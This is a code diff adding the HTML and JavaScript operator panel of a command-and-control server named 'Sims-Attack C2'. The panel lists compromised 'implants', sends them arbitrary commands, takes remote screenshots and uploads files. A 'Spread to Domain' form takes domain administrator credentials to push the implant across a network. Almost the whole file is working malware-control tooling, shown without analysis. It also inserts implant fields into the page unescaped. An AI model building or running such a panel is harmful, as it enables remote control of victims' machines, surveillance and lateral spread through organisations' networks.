@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sims-Attack C2</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
+    <style>
+        .implant-card {
+            margin-bottom: 1rem;
+        }
+        .command-output {
+            background-color: #1e1e1e;
+            color: #fff;
+            padding: 1rem;
+            border-radius: 4px;
+            font-family: monospace;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        .status-active {
+            color: #28a745;
+        }
+        .status-disconnected {
+            color: #dc3545;
+        }
+        .screenshot-preview {
+            max-width: 100%;
+            height: auto;
+            margin-top: 1rem;
+        }
+    </style>
+</head>
+<body>
+    <nav class="navbar navbar-dark bg-dark">
+        <div class="container-fluid">
+            <span class="navbar-brand mb-0 h1">Sims-Attack C2</span>
+        </div>
+    </nav>
+
+    <div class="container-fluid mt-4">
+        <div class="row">
+            <!-- Implants List -->
+            <div class="col-md-4">
+                <div class="card">
+                    <div class="card-header">
+                        <h5 class="card-title mb-0">Active Implants</h5>
+                    </div>
+                    <div class="card-body">
+                        <div id="implants-list">
+                            <!-- Implants will be added here dynamically -->
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Command Interface -->
+            <div class="col-md-8">
+                <div class="card">
+                    <div class="card-header">
+                        <h5 class="card-title mb-0">Command Interface</h5>
+                    </div>
+                    <div class="card-body">
+                        <div id="selected-implant-info" class="mb-3">
+                            <p class="text-muted">Select an implant to begin</p>
+                        </div>
+                        
+                        <!-- Command Input -->
+                        <div class="mb-3">
+                            <div class="input-group">
+                                <input type="text" id="command-input" class="form-control" placeholder="Enter command...">
+                                <button class="btn btn-primary" id="send-command">Send</button>
+                            </div>
+                        </div>
+
+                        <!-- Quick Actions -->
+                        <div class="mb-3">
+                            <button class="btn btn-secondary" id="take-screenshot">Take Screenshot</button>
+                            <button class="btn btn-secondary" id="spread-domain">Spread to Domain</button>
+                            <div class="btn-group">
+                                <button class="btn btn-secondary dropdown-toggle" type="button" data-bs-toggle="dropdown">
+                                    File Operations
+                                </button>
+                                <ul class="dropdown-menu">
+                                    <li><a class="dropdown-item" href="#" id="upload-file">Upload File</a></li>
+                                    <li><a class="dropdown-item" href="#" id="download-file">Download File</a></li>
+                                </ul>
+                            </div>
+                        </div>
+
+                        <!-- Command Output -->
+                        <div class="command-output" id="command-output">
+                            <!-- Command output will be displayed here -->
+                        </div>
+
+                        <!-- Screenshot Preview -->
+                        <div id="screenshot-preview" class="mt-3" style="display: none;">
+                            <img src="" alt="Screenshot" class="screenshot-preview">
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- File Upload Modal -->
+    <div class="modal fade" id="upload-modal" tabindex="-1">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title">Upload File</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+                </div>
+                <div class="modal-body">
+                    <form id="upload-form">
+                        <div class="mb-3">
+                            <label for="file-input" class="form-label">Select File</label>
+                            <input type="file" class="form-control" id="file-input">
+                        </div>
+                    </form>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
+                    <button type="button" class="btn btn-primary" id="upload-submit">Upload</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Domain Spread Modal -->
+    <div class="modal fade" id="spread-modal" tabindex="-1">
+        <div class="modal-dialog">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title">Domain Spread Configuration</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+                </div>
+                <div class="modal-body">
+                    <form id="spread-form">
+                        <div class="mb-3">
+                            <label for="domain-user" class="form-label">Domain User</label>
+                            <input type="text" class="form-control" id="domain-user" placeholder="domain\admin">
+                        </div>
+                        <div class="mb-3">
+                            <label for="domain-password" class="form-label">Domain Password</label>
+                            <input type="password" class="form-control" id="domain-password">
+                        </div>
+                    </form>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
+                    <button type="button" class="btn btn-primary" id="spread-submit">Start Spread</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://cdn.socket.io/4.7.4/socket.io.min.js"></script>
+    <script>
+        // Connect to Socket.IO server
+        const socket = io();
+
+        // Global variables
+        let selectedImplant = null;
+        const implants = new Map();
+
+        // Socket.IO event handlers
+        socket.on('connect', () => {
+            console.log('Connected to C2 server');
+            fetchImplants();
+        });
+
+        socket.on('implant_status', (data) => {
+            updateImplantStatus(data.implant_id, data.status);
+        });
+
+        socket.on('command_result', (data) => {
+            if (data.implant_id === selectedImplant) {
+                appendCommandOutput(data.result);
+                if (data.command === 'screenshot') {
+                    showScreenshot();
+                }
+            }
+        });
+
+        // Fetch implants from server
+        function fetchImplants() {
+            fetch('/api/implants')
+                .then(response => response.json())
+                .then(data => {
+                    const implantsList = document.getElementById('implants-list');
+                    implantsList.innerHTML = '';
+                    implants.clear();
+
+                    data.forEach(implant => {
+                        implants.set(implant.id, implant);
+                        addImplantCard(implant);
+                    });
+                })
+                .catch(error => console.error('Error fetching implants:', error));
+        }
+
+        // Add implant card to the list
+        function addImplantCard(implant) {
+            const implantsList = document.getElementById('implants-list');
+            const card = document.createElement('div');
+            card.className = 'card implant-card';
+            card.innerHTML = `
+                <div class="card-body">
+                    <h6 class="card-title">
+                        ${implant.hostname}
+                        <span class="status-badge status-${implant.status || 'disconnected'}">
+                            <i class="fa fa-circle"></i>
+                        </span>
+                    </h6>
+                    <p class="card-text">
+                        <small>IP: ${implant.ip}</small><br>
+                        <small>OS: ${implant.os}</small><br>
+                        <small>User: ${implant.user}</small>
+                    </p>
+                </div>
+            `;
+            card.onclick = () => selectImplant(implant.id);
+            implantsList.appendChild(card);
+        }
+
+        // Select an implant
+        function selectImplant(implantId) {
+            selectedImplant = implantId;
+            const implant = implants.get(implantId);
+            
+            // Update selected implant info
+            document.getElementById('selected-implant-info').innerHTML = `
+                <h6>Selected Implant: ${implant.hostname}</h6>
+                <small>IP: ${implant.ip} | OS: ${implant.os} | User: ${implant.user}</small>
+            `;
+            
+            // Enable command interface
+            document.getElementById('command-input').disabled = false;
+            document.getElementById('send-command').disabled = false;
+            document.getElementById('take-screenshot').disabled = false;
+            document.getElementById('spread-domain').disabled = false;
+            
+            // Clear command output
+            document.getElementById('command-output').innerHTML = '';
+            document.getElementById('screenshot-preview').style.display = 'none';
+        }
+
+        // Update implant status
+        function updateImplantStatus(implantId, status) {
+            const implant = implants.get(implantId);
+            if (implant) {
+                implant.status = status;
+                const card = document.querySelector(`[data-implant-id="${implantId}"]`);
+                if (card) {
+                    const statusBadge = card.querySelector('.status-badge');
+                    statusBadge.className = `status-badge status-${status}`;
+                }
+            }
+        }
+
+        // Send command to implant
+        function sendCommand(command) {
+            if (!selectedImplant) return;
+            
+            fetch(`/api/implants/${selectedImplant}/command`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ command })
+            })
+            .then(response => response.json())
+            .then(data => {
+                appendCommandOutput(`Command sent: ${command}`);
+            })
+            .catch(error => {
+                appendCommandOutput(`Error: ${error.message}`);
+            });
+        }
+
+        // Append text to command output
+        function appendCommandOutput(text) {
+            const output = document.getElementById('command-output');
+            const line = document.createElement('div');
+            line.textContent = text;
+            output.appendChild(line);
+            output.scrollTop = output.scrollHeight;
+        }
+
+        // Take screenshot
+        function takeScreenshot() {
+            if (!selectedImplant) return;
+            
+            fetch(`/api/implants/${selectedImplant}/screenshot`, {
+                method: 'POST'
+            })
+            .then(response => response.json())
+            .then(data => {
+                appendCommandOutput('Screenshot request sent...');
+            })
+            .catch(error => {
+                appendCommandOutput(`Error: ${error.message}`);
+            });
+        }
+
+        // Show screenshot
+        function showScreenshot() {
+            const preview = document.getElementById('screenshot-preview');
+            const img = preview.querySelector('img');
+            img.src = `/uploads/screenshot.png?t=${Date.now()}`;
+            preview.style.display = 'block';
+        }
+
+        // Event listeners
+        document.getElementById('send-command').addEventListener('click', () => {
+            const input = document.getElementById('command-input');
+            const command = input.value.trim();
+            if (command) {
+                sendCommand(command);
+                input.value = '';
+            }
+        });
+
+        document.getElementById('command-input').addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                document.getElementById('send-command').click();
+            }
+        });
+
+        document.getElementById('take-screenshot').addEventListener('click', takeScreenshot);
+
+        document.getElementById('upload-file').addEventListener('click', () => {
+            const modal = new bootstrap.Modal(document.getElementById('upload-modal'));
+            modal.show();
+        });
+
+        document.getElementById('upload-submit').addEventListener('click', () => {
+            const fileInput = document.getElementById('file-input');
+            const file = fileInput.files[0];
+            if (!file) return;
+
+            const formData = new FormData();
+            formData.append('file', file);
+
+            fetch(`/api/implants/${selectedImplant}/upload`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                appendCommandOutput(`File upload started: ${file.name}`);
+                bootstrap.Modal.getInstance(document.getElementById('upload-modal')).hide();
+            })
+            .catch(error => {
+                appendCommandOutput(`Error: ${error.message}`);
+            });
+        });
+
+        document.getElementById('spread-domain').addEventListener('click', () => {
+            const modal = new bootstrap.Modal(document.getElementById('spread-modal'));
+            modal.show();
+        });
+
+        document.getElementById('spread-submit').addEventListener('click', () => {
+            const domainUser = document.getElementById('domain-user').value;
+            const domainPassword = document.getElementById('domain-password').value;
+            
+            if (!domainUser || !domainPassword) {
+                appendCommandOutput('Error: Domain credentials required');
+                return;
+            }
+
+            // Set environment variables for the implant
+            fetch(`/api/implants/${selectedImplant}/command`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    command: 'spread',
+                    domain_user: domainUser,
+                    domain_password: domainPassword
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                appendCommandOutput('Domain spread initiated...');
+                bootstrap.Modal.getInstance(document.getElementById('spread-modal')).hide();
+            })
+            .catch(error => {
+                appendCommandOutput(`Error: ${error.message}`);
+            });
+        });
+
+        // Initialize
+        document.getElementById('command-input').disabled = true;
+        document.getElementById('send-command').disabled = true;
+        document.getElementById('take-screenshot').disabled = true;
+        document.getElementById('spread-domain').disabled = true;
+    </script>
+</body>
+</html> 
